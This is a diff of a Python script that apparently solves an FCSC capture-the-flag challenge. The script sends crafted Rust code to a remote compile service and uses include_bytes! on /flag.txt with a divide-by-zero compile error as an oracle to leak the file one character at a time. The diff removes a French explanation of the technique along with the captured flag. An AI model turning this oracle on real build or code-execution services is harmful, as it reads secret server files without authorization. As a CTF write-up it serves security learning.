@@ -1,23 +1,4 @@
 #!/usr/bin/env python3.8
-"""
-La chose importante utilisée ici est la macro include_bytes!(str)
-C'est, en gros, l'équivalent d'un #include en C/C++.
-La macro va être remplacer par le contenu du fichier en argument.
-
-Le type renvoyé est &[u8; n] avec n la longueur de la chaine.
-On peut donc tester en modifiant n à chaque fois.
-Si ça compile, c'est que c'est le bon n.
-
-On trouve une longueur de 71.
-
-Pour le contenu du fichier, on essaie de faire une division du type
-5 / (flag[i] - c)
-Si flag[i]=c alors il y a une division par 0 et donc la compilation échoue
-Sinon ça compile
-
-FCSC{a35036487430b24da38b43e1369f56e69a25bd39e594cd1e7ff3e97b62b3c638}
-"""
-
 import json
 import string
 import sys
@@ -55,7 +36,7 @@ def get_flag(size: int) -> int:
     flag = ""
     for i in range(size-1):
         for c in string.printable:
-            data = {"content": "const VALUE: i8 = 5 / (include_bytes!(\"/flag.txt\")["+str(i)+"] as i8 - b'"+c+"' as i8);"}
+            data = {"content": "const VALUE: i8 = 1 / (include_bytes!(\"/flag.txt\")["+str(i)+"] as i8 - b'"+c+"' as i8);"}
             jsonbytes = json.dumps(data).encode()
 
             req = urllib.request.Request(url_base)
